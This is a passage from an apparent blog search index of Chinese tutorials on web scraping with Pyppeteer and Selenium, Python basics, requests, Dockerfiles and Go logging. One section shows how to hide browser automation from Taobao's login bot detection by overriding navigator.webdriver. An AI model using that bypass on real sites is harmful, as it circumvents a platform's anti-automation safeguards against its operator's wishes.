分析网页源代码数据，如果数据是隐藏在 HTML 中的其他地方，以 JavaScript 变量的形式存在，直接提取就好了。\n- 分析 Ajax，很多数据可能是经过 Ajax 请求时候获取的，所以可以分析其接口。\n- 模拟 JavaScript 渲染过程，直接抓取渲染后的结果。\n\n\n\n而 Pyppeteer 和 Selenium 就是用的第三种方法，下面我们再用 Pyppeteer 来试试，如果用 Pyppeteer 实现如上页面的抓取的话，代码就可以写为如下形式：\n\n```python\nimport asyncio\nfrom pyppeteer import launch\nfrom pyquery import PyQuery as pq\n\nasync def main():\n    browser = await launch()\n    page = await browser.newPage()\n    await page.goto('http://quotes.toscrape.com/js/')\n    doc = pq(await page.content())\n    print('Quotes:', doc('.quote').length)\n    await browser.close()\n\nasyncio.get_event_loop().run_until_complete(main())\n```\n\n\n\n##### 3.2 webdriver 检测问题\n\n有些网站还是会检测到是 webdriver 吧，比如淘宝检测到是 webdriver 就会禁止登录了\n\n其实淘宝主要通过 window.navigator.webdriver 来对 webdriver 进行检测，所以我们只需要使用 JavaScript 将它设置为 false 即可，代码如下：\n\n```python\nimport asyncio\nfrom pyppeteer import launch\n\nasync def main():\n    browser = await launch(headless=False, args=['--disable-infobars'])\n    page = await browser.newPage()\n    await page.goto('https://login.taobao.com/member/login.jhtml?redirectURL=https://www.taobao.com/')\n    await page.evaluate(\n        '''() =>{ Object.defineProperties(navigator,{ webdriver:{ get: () => false } }) }''')\n    await asyncio.sleep(100)\n\nasyncio.get_event_loop().run_until_complete(main())\n```\n\n\n\n##### 3.3 保持用户记录\n\n很多朋友在每次启动 Selenium 或 Pyppeteer 的时候总是是一个全新的浏览器，那就是没有设置用户目录，如果设置了它，每次打开就不再是一个全新的浏览器了，它可以恢复之前的历史记录，也可以恢复很多网站的登录信息。那么这个怎么来做呢？很简单，在启动的时候设置 userDataDir 就好了，示例如下：\n\n```python\nimport asyncio\nfrom pyppeteer import launch\n\nasync def main():\n    browser = await launch(headless=False, userDataDir='./userdata', args=['--disable-infobars'])\n    page = await browser.newPage()\n    await page.goto('https://www.taobao.com')\n    await asyncio.sleep(100)\n\nasyncio.get_event_loop().run_until_complete(main())\n```\n\n\n\n### 4. 参考资料\n\n+ https://github.com/miyakogi/pyppeteer\n+ [Python爬虫入门教程 24-100 微医挂号网医生数据抓取](https://juejin.im/post/5c35944b6fb9a049de6d8dd2)\n+ [Python中与selenium齐名的pyppeteer库](https://zhuanlan.zhihu.com/p/63634783)\n+ [pyppeteer使用遇到的bug及解决方法](https://www.sanfenzui.com/pyppeteer-bug-collection.html)\n+ https://juejin.im/post/59e5a86c51882578bf185dba","tags":["爬虫"],"categories":["python"]},{"title":"python爬虫基础","url":"%2Fp%2F2412099c.html","content":"\n\n\n### 0. 前言\n\n网络爬虫（又被称为网页蜘蛛，网络机器人，在FOAF社区中间，更经常的称为网页追逐者），是一种按照一定的规则，自动的抓取万维网信息的程序或者脚本。\n\n我认为一次爬虫的过程, 就是网络请求到数据后, 处理数据, 然后发送数据的过程.\n\n<!-- more -->\n\n### 1. 网络请求(requests)\n\n python网络请求主要有 `urllib` 和 `requests`  库, 墙裂推荐`requests`\n\n```python\nimport requests\n\nurl = 'http://www.baidu.com'\nresponse = requests.get(url)\nhtml = response.text\nprint(html)\n\n\nimport requests\n\nurl = \"http://docs.python-requests.org/zh_CN/latest/_static/requests-sidebar.png\"\nresponse = requests.get(url)\nwith open('image.png','wb') as f:\n  f.write(response.content)\n```\n\n\n\n### 2. 数据提取 (pyquery)\n\n一般我们请求的数据主要分以下几类:\n\n+ html, xml\n+ json\n+ 字符串\n\n对于 html, xml 我们要使用相关的库进行处理, json直接反序列化处理, 字符串可能需要字符串匹配 和 正则表达式 处理\n\n\n\n> 对html/xml 处理的库主要有以下几种:\n\n##### 2.1 beautifulsoup\n\n```bash\npip install beautifulsoup4\n```\n\nbeautiful Soup将复杂HTML文档转换成一个复杂的树形结构,每个节点都是Python对象\n\n##### 2.2 lxml\n\nlxml 使用的是 xpath 技术\n\n```bash\npip install lxml\n```\n\n##### 2.3  lxml, beautifulSoup 对比\n\nBeautifulSoup是一个库，而XPath是一种技术，python中最常用的XPath库是lxml，因此，这里就拿lxml来和BeautifulSoup做比较吧.\n\n+ 性能 lxml >> BeautifulSoup\n\nBeautifulSoup和lxml的原理不一样，BeautifulSoup是基于DOM的，会载入整个文档，解析整个DOM树，因此时间和内存开销都会大很多。而lxml只会局部遍历，另外lxml是用c写的，而BeautifulSoup是用python写的，因此性能方面自然会差很多。\n\n+ 易用性 BeautifulSoup >> lxml\n\nBeautifulSoup用起来比较简单，API非常人性化，支持css选择器。lxml的XPath写起来麻烦，开发效率不如BeautifulSoup。\n\n```\ntitle = soup.select('.content div.title h3')\n```\n\n同样的代码用Xpath写起来会很麻烦\n\n```\ntitle = tree.xpath(\"//*[@class='content']/div[@class='content']/h3\")\n```\n\n##### 2.4. pyquery \n\npyquery 可让你用 jQuery 的语法来对 html/xml 进行操作。这和 jQuery 十分类似。这个库不是（至少还不是）一个可以和 JavaScript交互的代码库，它只是非常像 jQuery API 而已。\n\n```bash\npip install pyquery\n```\n\n我们可以看下面这个例子:\n\n```python\n    def parse_html(self,content):\n        doc = pq(content)\n        items = doc(\".dt\").items()\n        for item in items:\n            title = item.find(\"center\").text()\n            for i in item.find(\"th\").items():\n                category = i.find(\"a\").eq(0).text()\n                neirong = i.find(\"a\").eq(1).text()\n                url = i.find(\"a\").eq(1).attr('href')\n\n                one_data = {\n                    \"category\": category,\n                    \"context\": neirong,\n                    \"url\": url,\n                }\n                print(one_data)\n```\n\n\n\n### 3. 无头浏览器(pyppeteer)\n\n以前写爬虫，遇到需要登录的页面，一般都是通过chrome的检查元素，查看登录需要的参数和加密方法，如果网站的加密非常复杂，例如登录qq的，就会很蛋疼。\n\n现在有了无头浏览器，再也不需要考虑登录的参数和加密了，用无头浏览器打开页面，通过JS或JQuery语句，填入账号和密码，然后点击登陆，然后把Cookies保存下来，就可以模拟登陆了。\n\n\n\n##### 3.1 PhantomJS(暂停开发)\n\n```\nserWarning: Selenium support for PhantomJS has been deprecated, please use headless versions of Chrome or Firefox instead\n\n新版本的Selenium不再支持PhantomJS了，请使用Chrome或Firefox的无头版本来替代。\n```\n\n\n\nPhantomJS是一个无界面的,可脚本编程的WebKit浏览器引擎。它原生支持多种web 标准：DOM 操作，CSS选择器，JSON，Canvas 以及SVG。因此可以比浏览器更加快速的解析处理js加载。\n\n\n\n有时，我们需要浏览器处理网页，但并不需要浏览，比如生成网页的截图、抓取网页数据等操作。[PhantomJS](http://phantomjs.org/)的功能，就是提供一个浏览器环境的命令行接口，你可以把它看作一个“虚拟浏览器”，除了不能浏览，其他与正常浏览器一样。它的内核是WebKit引擎，不提供图形界面，只能在命令行下使用，我们可以用它完成一些特殊的用途。\n\n\n\n下载: https://phantomjs.org/download.html , 然后把二进制放到一个目录下, 增加个$PATH 指定即可\n\n```\nphantomjs -v\n```\n\n\n\n##### 3.2. selenium\n\nselenium 是什么？一句话，自动化测试工具。它支持各种浏览器，包括 Chrome，Safari，Firefox 等主流界面式浏览器。换句话说叫 Selenium 支持这些浏览器驱动。话说回来，PhantomJS不也是一个浏览器吗，那么 Selenium 支持不？答案是肯定的，这样二者便可以实现无缝对接了。有人问，为什么不直接用浏览器而用一个没界面的 PhantomJS 呢？答案是：效率高！\n\n\n\n嗯，所以呢？安装一下 Python 的 Selenium 库，再安装好 PhantomJS，不就可以实现 Python＋Selenium＋PhantomJS 的无缝对接了嘛！Selenium 用来驱动浏览器, PhantomJS 用来渲染解析界面, Python 进行后期的处理，完美的三剑客！\n\n\n\n```\npip install selenium\n```\n\n\n\n然后我们看一个例子, 通过 selenium 驱动 [chrome driver](https://sites.google.com/a/chromium.org/chromedriver/downloads)打开百度搜索关键词\n\n```python\nfrom selenium import webdriver\nfrom selenium.webdriver.common.keys import Keys\n\nbrowser = webdriver.Chrome(executable_path=\"./drivers/chromedriver\")\nbrowser.get('http://www.baidu.com/')\n\nkw = browser.find_element_by_id(\"kw\")\nkw.send_keys(\"Selenium\", Keys.RETURN)\n```\n\n\n\n##### 3.3. pyppeteer \n\npyppeteer 是依赖于 chromium 这个浏览器来运行的,  并且是基于 python 的新特性 async 实现的，所以它的一些执行也支持异步操作，效率相对于 selenium 来说也提高了。\n\n```bash\npip3 install pyppeteer\n```\n\n我们可以来看下面这个例子, 是打开baidu 后截图\n\n```python\nimport asyncio\nfrom pyppeteer import launch\n\nasync def main():\n    browser = await launch()\n    page = await browser.newPage()\n    await page.goto('http://www.baidu.com')\n    await page.screenshot({'path': 'example.png'})\n    await browser.close()\n\nasyncio.get_event_loop().run_until_complete(main())\n```\n\n\n\n### 4. 爬虫框架\n\n\n\n##### 4.1 pyspider\n\npyspider上手更简单，操作更加简便，因为它增加了 WEB 界面，写爬虫迅速，集成了phantomjs，可以用来抓取js渲染的页面。\n\n```bash\npip install pyspider\n```\n\n安装成功后在 [python 3.7 下运行就报错](https://github.com/binux/pyspider/issues/817), 看来作者很久没维护了\n\n\n\n\n##### 4.2 scrapy\n\n```bash\npip install Scrapy\n```\n\nscrapy自定义程度高，比 PySpider更底层一些，适合学习研究，需要学习的相关知识多，不过自己拿来研究分布式和多线程等等是非常合适的。\n\n\n\n### 5. 爬虫其他(TODO)\n\n##### 5.1 多线程\n\n thread 库\n\n##### 5.2 多进程\n\nmultiprocessing 库\n\n\n\n### 6. 参考资料\n\n+ https://cuiqingcai.com/1052.html\n+ https://cuiqingcai.com/6942.html\n+ https://github.com/Kr1s77/Python-crawler-tutorial-starts-from-zero","tags":["爬虫"],"categories":["爬虫"]},{"title":"python_requests的使用","url":"%2Fp%2F4a761254.html","content":"\n\n\nrequest是一个简答优雅的python HTTP库，相较于python标准库中的urllib和urllib2的库，requests更加的便于理解和使用.\n\n\n\n### 1. 安装 requests\n\n```bash\npip install requests\n```\n\n<!-- more -->\n\n### 2. requests包的使用\n\n##### get\n\n```\n>>> payload = {'key1': 'value1', 'key2': 'value2'}\n>>> r = requests.get('https://httpbin.org/get', params=payload)\n\n>>> print(r.url)\nhttps://httpbin.org/get?key2=value2&key1=value1\n```\n\n\n\n##### post\n\n```python\nimport requests\nimport json\n\nheaders = {'content-type': 'application/json'}\nurl = 'http://192.168.3.45:8080/api/v2/event/log'\n\ndata = {\"eventType\": \"AAS_PORTAL_START\", \"data\": {\"uid\": \"hfe3hf45huf33545\", \"aid\": \"1\", \"vid\": \"1\"}}\nparams = {'sessionKey': '9ebbd0b25760557393a43064a92bae539d962103', 'format': 'xml', 'platformId': 1}\n\nrequests.post(url, params=params, data=json.dumps(data), headers=headers, timeout=2)\n```\n\n\n\n##### parse \n\n```python\nimport requests\nrequests.get(url).json()\n```\n\n\n\n\n\n### 3. 参考资料:\n\n+ https://2.python-requests.org//zh_CN/latest/user/quickstart.html","tags":["requests"],"categories":["python"]},{"title":"python基础实践","url":"%2Fp%2Fd319c20d.html","content":"\n### 1. 模块\n\nPython 模块(Module)，是一个 Python 文件，以 .py 结尾，包含了 Python 对象定义和Python语句。\n\n```python\nfrom pkg.func import hello\n# pkg 是模块名字,就是目录名字\n# pkg.func 是 pkg 目录下的 func 文件\n# hello 是 func 文件的 hello函数\n\n\nfrom pkg.topic import Topic\n# Topic 是 topic 文件的 类\n```\n\n\n\n+ `__init__.py` ,如果目录中存在该文件，该目录就会被识别为 module package 。\n+ `__init__.py` 在包被导入时会被执行。该文件就是一个正常的python代码文件，因此可以将初始化代码放入该文件中。\n\n<!-- more -->\n\n### 2. python命名规范\n\n##### 2.1 模块\n\n- 模块尽量使用小写命名，首字母保持小写，尽量不要用下划线(除非多个单词，且数量不多的情况)\n\n```python\n# 正确的模块名\nimport decoder\nimport html_parser\n\n# 不推荐的模块名\nimport Decoder\n```\n\n##### 2.2 类名\n\n- 类名使用驼峰(CamelCase)命名风格，首字母大写，私有类可用一个下划线开头\n\n```Python\nclass Farm():\n    pass\n\nclass AnimalFarm(Farm):\n    pass\n\nclass _PrivateFarm(Farm):\n    pass\n```\n\n- 将相关的类和顶级函数放在同一个模块里. 不像Java, 没必要限制一个类一个模块.\n\n##### 2.3 函数\n\n- 函数名一律小写，如有多个单词，用下划线隔开\n\n```python\ndef run():\n    pass\n\ndef run_with_env():\n    pass\n```\n\n- 私有函数在函数前加一个下划线_\n\n```python\nclass Person():\n    def _private_func():\n        pass\n```\n\n##### 2.4 变量名\n\n- 变量名尽量小写, 如有多个单词，用下划线隔开\n\n```python\nif __name__ == '__main__':\n    count = 0\n    school_name = ''\n```\n\n##### 2.5 常量\n\n- 常量使用以下划线分隔的大写命名\n\n```python\nMAX_CLIENT = 100\nMAX_CONNECTION = 1000\nCONNECTION_TIMEOUT = 600\n```\n\n\n\n### 3. python 方法返回多个值\n\n```python\ndef f():\n    return True, False\n  \n  \nx, y = f()\nprint(x)\nprint(y)\n\ngives:\nTrue\nFalse\n```\n\n\n\n### 4. sprintf()格式化输出\n\n```python\n# 字符串\n'%s %s' % ('one', 'two')\n'{} {}'.format('one', 'two')\none two\n\n\n# int\n'%d %d' % (1, 2)\n'{} {}'.format(1, 2)\n1 2\n\n\n# float\n'%f' % (3.141592653589793,)\n'{:f}'.format(3.141592653589793)\n3.141593\n\n\n# 顺序\n'{1} {0}'.format('one', 'two')\ntwo one\n```\n\n\n\n### 5.  for循环\n\n```python\n# for in 循环\nfruits = [\"apple\", \"banana\", \"cherry\"]\nfor x in fruits:\n  print(x)\n  \n  \n# range循环\nfor x in range(2, 6):\n  print(x)#2 3 4 5\nfor x in range(2, 10, 3):\n  print(x)# 2 5 8\n  \n  \n\n# 循环带 k, v\npresidents = [\"Washington\", \"Adams\", \"Jefferson\", \"Madison\", \"Monroe\", \"Adams\", \"Jackson\"]\nfor num, name in enumerate(presidents, start=1):\n    print(\"President {}: {}\".format(num, name))\n    \n  \n# 循环多个\ncolors = [\"red\", \"green\", \"blue\", \"purple\"]\nratios = [0.2, 0.3, 0.1, 0.4]\nfor color, ratio in zip(colors, ratios):\n    print(\"{}% {}\".format(ratio * 100, color))\n    \n    \n# 死循环\nwhile True:\n  pass\n```\n\n\n\n### 6. `if __name__ == 'main'`\n\n一个python的文件有两种使用的方法，第一是直接作为脚本执行，第二是import到其他的python脚本中被调用（模块重用）执行。\n\n\n\n`if __name__ == 'main'`: 的作用就是控制这两种情况执行代码的过程，在`if __name__ == 'main'`: 下的代码只有在第一种情况下（即文件作为脚本直接执行）才会被执行，而import到其他脚本中是不会被执行的。\n\n\n\n\n\n### 7. `__pycache__`\n\n在python中运行程序时，解释器首先将其编译为字节码，并将其存储在`__pycache__`文件夹。如果您在那里查找，您将发现一堆文件共享的名称。在项目文件夹中的Py文件，只有它们的扩展名才是其中之一.PYC或.pyo.。这些分别是字节码编译和优化字节码编译版本的程序的文件。\n\n\n下次再执行工程时，若解释器发现这个 *.py 脚本没有修改过，就会跳过编译这一步，直接运行以前生成的保存在 __pycache__文件夹里的 *.pyc 文件。\n\n这样工程较大时就可以大大缩短项目运行前的准备时间；如果你只需执行一个小工程，没关系 忽略这个文件夹就行。\n\n\n\n### 8. 打开文件设置编码读取\n\n```python\nwith open(\"1.html\", \"r\", encoding='gbk') as f:\n  contents = f.read()\n  parse_html(contents)\n```\n\n\n\n### 9. 读写 json 文件\n\n```python\nclass File(object):\n    def __init__(self):\n        self.name = \"zk8.json\"\n        if not os.path.exists(self.name): # 没有就写一下\n            with open(self.name, 'w'): pass\n\n\n    def save(self, data):\n        with open(self.name, 'w', encoding='utf-8') as f:\n            json.dump(data, f, ensure_ascii=False, indent=4)\n\n\n    def load(self):\n        with open(self.name, 'r', encoding='utf-8') as f:\n            data = json.load(f)\n            return data\n\n```\n\n\n\n### 10. 数据结构 操作\n\n```python\n############ list ############\n>>> fruits = ['orange', 'apple', 'pear', 'banana', 'kiwi', 'apple', 'banana']\n>>> fruits.count('apple')\n2\n>>> fruits.count('tangerine')\n0\n>>> fruits.index('banana')\n3\n>>> fruits.index('banana', 4)  # Find next banana starting a position 4\n6\n>>> fruits.reverse()\n>>> fruits\n['banana', 'apple', 'kiwi', 'banana', 'pear', 'apple', 'orange']\n>>> fruits.append('grape')\n>>> fruits\n['banana', 'apple', 'kiwi', 'banana', 'pear', 'apple', 'orange', 'grape']\n>>> fruits.sort()\n>>> fruits\n['apple', 'apple', 'banana', 'banana', 'grape', 'kiwi', 'orange', 'pear']\n>>> fruits.pop()\n'pear'\n\n\n############ tuple ############\n\n>>> t = 12345, 54321, 'hello!'\n>>> t[0]\n12345\n>>> t\n(12345, 54321, 'hello!')\n>>> # Tuples may be nested:\n... u = t, (1, 2, 3, 4, 5)\n>>> u\n((12345, 54321, 'hello!'), (1, 2, 3, 4, 5))\n>>> # Tuples are immutable:\n... t[0] = 88888\nTraceback (most recent call last):\n  File \"<stdin>\", line 1, in <module>\nTypeError: 'tuple' object does not support item assignment\n>>> # but they can contain mutable objects:\n... v = ([1, 2, 3], [3, 2, 1])\n>>> v\n([1, 2, 3], [3, 2, 1])\n\n############ set ############\n\n>>> basket = {'apple', 'orange', 'apple', 'pear', 'orange', 'banana'}\n>>> print(basket)                      # show that duplicates have been removed\n{'orange', 'banana', 'pear', 'apple'}\n>>> 'orange' in basket                 # fast membership testing\nTrue\n>>> 'crabgrass' in basket\nFalse\n\n>>> # Demonstrate set operations on unique letters from two words\n...\n>>> a = set('abracadabra')\n>>> b = set('alacazam')\n>>> a                                  # unique letters in a\n{'a', 'r', 'b', 'c', 'd'}\n>>> a - b                              # letters in a but not in b\n{'r', 'd', 'b'}\n>>> a | b                              # letters in a or b or both\n{'a', 'c', 'r', 'd', 'b', 'm', 'z', 'l'}\n>>> a & b                              # letters in both a and b\n{'a', 'c'}\n>>> a ^ b                              # letters in a or b but not both\n{'r', 'd', 'b', 'm', 'z', 'l'}\n\n\n\n\n############ dict ############\n>>> tel = {'jack': 4098, 'sape': 4139}\n>>> tel['guido'] = 4127\n>>> tel\n{'jack': 4098, 'sape': 4139, 'guido': 4127}\n>>> tel['jack']\n4098\n>>> del tel['sape']\n>>> tel['irv'] = 4127\n>>> tel\n{'jack': 4098, 'guido': 4127, 'irv': 4127}\n>>> list(tel)\n['jack', 'guido', 'irv']\n>>> sorted(tel)\n['guido', 'irv', 'jack']\n>>> 'guido' in tel\nTrue\n>>> 'jack' not in tel\nFalse\n\n# 避免 循环中删除 key 报错\nfor i in list(d):\n  del d[i]\n```\n\n\n\n\n\n### 11. 类的特殊函数\n\n```python\n# __init__ 构造\nclass Foo:\n    def __init__(self, a, b, c):\nx = Foo(1, 2, 3) \n\n## __del__ 析构\nclass FileObject:\n    def __del__(self):\n        self.file.close()\n        del self.file\n\n\n# __call__ 类变成可调用\nclass Foo:\n    def __call__(self, a, b, c):\nx = Foo()\nx(1, 2, 3) \n\n\n#__getattr__ 不存在的属性\nclass Dummy(object):\n    def __getattr__(self, attr):\n        return attr.upper()\nd = Dummy()\nd.does_not_exist # 'DOES_NOT_EXIST'\n```\n\n\n\n### 12. 枚举\n\n```python\nfrom enum import Enum \nclass Animal(Enum):\n    ant = 1\n    bee = 2\n    cat = 3\n    dog = 4\n```\n\n\n\n### 13. 新的线程定时执行函数\n\n```python\ntimer = threading.Timer(10, func)\ntimer.start()\n```\n\n\n\n### 14. PYTHONPATH \n\n主要解决 ModuleNotFoundError: No module named 'pkg'\n\n```bash\necho $PYTHONPATH\nexport PYTHONPATH=\"/Users/liuwei/workspace/python/zk8\"\n```\n\n\n\n### 15. time\n\n```python\n# time format\nfrom datetime import datetime\ndatetime.now().strftime(\"%Y-%m-%d %H:%M:%S\")\n\n# time diff\ndef get_time_diff(date):\n    FMT = '%Y-%m-%d %H:%M'\n    now = datetime.datetime.strptime(time.strftime(FMT), FMT)\n    start = datetime.datetime.strptime(date, FMT)\n    return (now - start).seconds\n  \n  \n# seconds to human  \nstr(datetime.timedelta(seconds=get_time_diff(10000)))\n```\n\n\n\n### 16. try catch\n\n```python\n# except and raise\ntry:\n    f = open('myfile.txt')\n    s = f.readline()\n    i = int(s.strip())\nexcept OSError as err:\n    print(\"OS error: {0}\".format(err))\nexcept ValueError:\n    print(\"Could not convert data to an integer.\")\nexcept:\n    print(\"Unexpected error:\", sys.exc_info()[0])\n    raise\n    \n\n # 拿到 error 信息\ntry:\n  except Exception as e:\n  else:\n    \n try:\n  except Exception as e:\n  finally:\n```\n\n\n\n### 17. string\n\n```python\nstring = 'GeeksforGeeks'\nprint(string.lower()) \nprint(string.upper()) \n\n\n# contain\n>>> str = \"Messi is the best soccer player\"\n>>> \"soccer\" in str\nTrue\n```\n\n\n\n\n\n### 18. 类\n\n```python\n\"\"\"\n（1）_xxx      \"单下划线 \" 开始的成员变量叫做保护变量，意思是只有类实例和子类实例能访问到这些变量，\n需通过类提供的接口进行访问；不能用'from module import *'导入\n（2）__xxx    类中的私有变量/方法名 （Python的函数也是对象，所以成员方法称为成员变量也行得通。）,\n\" 双下划线 \" 开始的是私有成员，意思是只有类对象自己能访问，连子类对象也不能访问到这个数据。\n（3）__xxx__ 系统定义名字，前后均有一个“双下划线” 代表python里特殊方法专用的标识，如 __init__（）代表类的构造函数。\n\"\"\"\n```\n\n\n\n\n\n### 19. 打乱list\n\n```\ncats = list(range(10, 17))\nrandom.shuffle(cats)\n```\n\n\n\n### *arg 和**args\n\nhttp://www.wklken.me/posts/2013/12/21/how-to-use-args-and-kwargs-in-python.html","tags":["python"],"categories":["python"]},{"title":"记录一次docker镜像的构建过程","url":"%2Fp%2F2450240c.html","content":"\n在制作 Docker Images 之前, 我们先看一下Docker 官方提供了一些建议和准则，在大多数情况下建议遵守。\n\n+ 容器是短暂的，也就是说，你需要可以容易的创建、销毁、配置你的容器。\n\n+ 多数情况，构建镜像的时候是将 Dockerfile 和所需文件放在同一文件夹下。但为了构建性能，我们可以采用 [.dockerignore](https://deepzz.com/post/dockerfile-reference.html#toc_6) 文件来排除文件和目录。\n\n+ 避免安装不必要的包，构建镜像应该尽可能减少复杂性、依赖关系、构建时间及镜像大小。\n\n+ 最小化层数。 Dockerfile的一行(除MAINTAINER外)对应镜像的一层，为使层数足够小，故可以将类似的命令串起来，比如RUN 指令，可以使用&&连接多个指令，如此也只有一层。\n\n+ 排序多行参数，通过字母将参数排序来缓解以后的变化，这将帮你避免重复的包、使列表更容易更新，如：\n\n```dockerfile\nRUN apt-get update && apt-get install -y \\\n  bzr \\\n  cvs \\\n  git \\\n  mercurial \\\n  subversion\n```\n\n<!-- more -->\n\n\n\n### 0. 前言\n\n容器内没有后台服务的概念。容器就是为了主进程而存在的，主进程退出，容器就失去了存在的意义，从而退出，其它辅助进程不是它需要关心的东西。所以CMD 运行可执行程序, 阻塞才可以, 要不然会退出。\n\n\n\n###  1. FROM 仓库\n\n尽可能的使用官方仓库存储的镜像作为基础镜像。官方建议使用 [Debian](https://hub.docker.com/_/debian/)，大小在 150mb 左右。不过在实际开发中，应该用到 [alpine](https://hub.docker.com/_/alpine/) 的次数比较多，因为它仅 5mb 左右。 busybox更只有1M多。\n\n参考: https://blog.csdn.net/bbwangj/article/details/81088231\n\n\n\n### 2. 指令\n\n##### 2.1 COPY 和 ADD 的区别\n\n在大多数情况下使用COPY, 使用ADD的唯一原因就是你有一个压缩文件，你想自动解压到镜像中。\n\n##### 2.2 RUN 和 CMD 的区别\n\n+ RUN命令是创建Docker镜像的步骤，一个Dockerfile中可以有许多个RUN命令。\n+ CMD命令是当Docker镜像被启动后Docker容器将会默认执行的命令。一个Dockerfile中只能有一个CMD命令。通过执行docker run $image other_command启动镜像可以重载CMD命令。\n\n##### 2.3 ENTRYPOINT 和 CMD的区别\n\nThe main purpose of a CMD is to provide defaults for an executing container. These defaults can include an executable, or they can omit the executable, in which case you must specify an ENTRYPOINT instruction as well.\n\n如果docker run没有指定任何的执行命令或者dockerfile里面也没有entrypoint，那么，就会使用cmd指定的默认的执行命令执行。同时也从侧面说明了entrypoint的含义，它才是真正的容器启动以后要执行命令。\n\n+ CMD的用法\n\n  ```\n  The CMD instruction has three forms:\n   \n  CMD [\"executable\",\"param1\",\"param2\"] (exec form, this is the preferred form) //推荐\n  CMD [\"param1\",\"param2\"] (as default parameters to ENTRYPOINT)\n  CMD command param1 param2 (shell form)\n  \n  \n  \n  \n  \n  \n  eg1: CMD [\"/bin/bash\", \"-c\", \"echo 'hello cmd!'\"]\n  eg2: CMD [\"hello cmd!\"]\n\t\t ENTRYPOINT [\"echo\"]\n  eg3: CMD echo \"hello cmd!\"\n  ```\n  \n  \n  \n+ entrypoint的用法\n\n  An ENTRYPOINT allows you to configure a container that will run as an executable.\n\n  ```\n  ENTRYPOINT has two forms:\n  \n  ENTRYPOINT [\"executable\", \"param1\", \"param2\"] (exec form, preferred) //推荐\n  ENTRYPOINT command param1 param2 (shell form)\n  \n  \n  \n  \n  \n  eg1: 如果命令后面有东西，那么后面的全部都会作为entrypoint的参数。如果没有，但是cmd有，那么cmd的全部内容会作为entrypoint的参数, 会输出 hello cmd 的\n  \n  CMD [\"hello cmd!\"]\n  ENTRYPOINT [\"echo\"]\n  \n  \n  \n  \n  eg2: 这个时候是不会输出 hello cmd 的\n  \n  CMD [\"hello cmd!\"]\n  ENTRYPOINT echo\n  ```\n\n+ 覆盖问题\n\n  + cmd 除非默认, 否则轻易被覆盖\n\n  + entrypoint 可以用 --entrypoint 覆盖\n\n  + 所以建议entrypoint固定, cmd 被覆盖, 结合使用, 并且永远使用Exec表示法\n\n\n\n##### 2.9 环境变量写法\n\n```\nENV KS_HAVEN_ADDR=':16097' \\\nKS_HAVEN_QUIC_ADDR=':16097'\n```\n\n\n\n### 3. 构建镜像\n\n在 Dockerfile 文件所在目录执行：    `docker build -t image_name .`\n\n\n\n##### 3.1 构建的上下文\n\n1. c/s架构, 在服务端构建\n2. 服务端要获取文件, 需要把上下文目录打包发过去 (COPY ../package.json /app 或者 COPY /opt/xxxx /app 无法成功, 超出了上下文)\n3. 最好将dockerfile放在空目录下或项目根目录下, 如果没有所需文件,拷贝过来, 避免发送太多文件给引擎\n\n\n\n##### 3.2 镜像 save load\n\n```bash\ndocker images #查看构建的image\n\ndocker save image/test > image_test.tar.gz # save image\n\ndocker load -i image_test.tar.gz # load image\n```\n\n\n\n### 4. 容器操作\n\n\n\n##### 4.1 运行和进入容器\n\n```bash\ndocker run -d -p 16097:16097 -p 15098:15098  image_name # 启动容器\n\ndocker extc -it 容器名字 bash # 进入容器内部\ndocker exec -it 容器ID  sh   # 进入容器内部\n```\n\n\n\n##### 4.2 看容器log\n\n```bash\ndocker logs -f CONTAINER_ID\n\ndocker logs -f --tail=100 CONTAINER_ID\n```\n\n\n\n##### 4.3 容器和宿主拷贝内容\n\n```bash\ndocker cp foo.txt mycontainer:/foo.txt \ndocker cp mycontainer:/foo.txt foo.txt\n```\n\n\n\n##### 4.4 容器访问宿主主机端口\n\n+ https://jingsam.github.io/2018/10/16/host-in-docker.html\n\n\n\n### 5. 参考资料\n\n+ https://blog.csdn.net/wdq347/article/details/78753322 docker之镜像制作\n+ https://deepzz.com/post/dockerfile-best-practices.html  如何写好Dockerfile，Dockerfile最佳实践","tags":["docker"],"categories":["docker"]},{"title":"golang的log库zap的使用","url":"%2Fp%2F5d303099.html","content":"\n\n\n### 0. 前言\n\n日志作为整个代码行为的记录，是程序执行逻辑和异常最直接的反馈。对于整个系统来说，日志是至关重要的组成部分。通过分析日志我们不仅可以发现系统的问题，同时日志中也蕴含了大量有价值可以被挖掘的信息，因此合理地记录日志是十分必要的。\n\n<!-- more -->\n\n### 1. golang log libs\n\n目前golang主流的 log库有\n\n+ https://github.com/uber-go/zap\n+ https://github.com/Sirupsen/logrus\n\nzap 跟 logrus 以及目前主流的 go 语言 log 类似，提倡采用结构化的日志格式，而不是将所有消息放到消息体中，简单来讲，日志有两个概念：字段和消息。字段用来结构化输出错误相关的上下文环境，而消息简明扼要的阐述错误本身。\n\n##### 1.1 log库使用和性能对比\n\n```go\npackage main\n\nimport (\n\t\"encoding/json\"\n\t\"fmt\"\n\t\"log\"\n\t\"math/rand\"\n\t\"time\"\n\n\t\"github.com/golang/glog\"\n\t\"github.com/sirupsen/logrus\"\n\t\"go.uber.org/zap\"\n)\n\ntype dummy struct {\n\tFoo string `json:\"foo\"`\n\tBar string `json:\"bar\"`\n}\n\nconst letterBytes = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\"\nconst (\n\tletterIdxBits = 6                    // 6 bits to represent a letter index\n\tletterIdxMask = 1<<letterIdxBits - 1 // All 1-bits, as many as letterIdxBits\n\tletterIdxMax  = 63 / letterIdxBits   // # of letter indices fitting in 63 bits\n)\n\nfunc RandString(n int) string {\n\tb := make([]byte, n)\n\t// A rand.Int63() generates 63 random bits, enough for letterIdxMax letters!\n\tfor i, cache, remain := n-1, rand.Int63(), letterIdxMax; i >= 0; {\n\t\tif remain == 0 {\n\t\t\tcache, remain = rand.Int63(), letterIdxMax\n\t\t}\n\t\tif idx := int(cache & letterIdxMask); idx < len(letterBytes) {\n\t\t\tb[i] = letterBytes[idx]\n\t\t\ti--\n\t\t}\n\t\tcache >>= letterIdxBits\n\t\tremain--\n\t}\n\treturn string(b)\n}\n\nfunc dummyData() interface{} {\n\treturn dummy{\n\t\tFoo: RandString(12),\n\t\tBar: RandString(16),\n\t}\n}\n\nfunc main() {\n\n\t// logrus\n\tvar x int64 = 0\n\tt := time.Now()\n\tfor i := 0; i < 10000; i++ {\n\t\tlogrus.WithField(\"Dummy\", dummyData()).Infoln(\"this is a dummy log\")\n\t}\n\tx += time.Since(t).Nanoseconds()\n\n\t// zap\n\tzlogger, _ := zap.NewProduction()\n\tsugar := zlogger.Sugar()\n\tvar y int64 = 0\n\tt = 